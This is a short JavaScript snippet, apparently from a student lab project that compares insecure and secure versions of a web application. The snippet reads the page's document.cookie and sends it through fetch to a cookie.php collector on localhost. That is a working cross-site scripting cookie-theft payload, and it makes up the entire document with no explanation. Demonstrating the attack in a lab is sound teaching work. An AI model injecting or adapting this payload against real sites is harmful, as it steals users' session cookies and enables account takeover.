const cookies = document.cookie;
fetch(`http://localhost/Asc_LiJiaChong_Tp056076_Sourcecode_Insecure_and_secure/cookie.php?cookie=${cookies}`).then(
    res => {console.log(res)}
)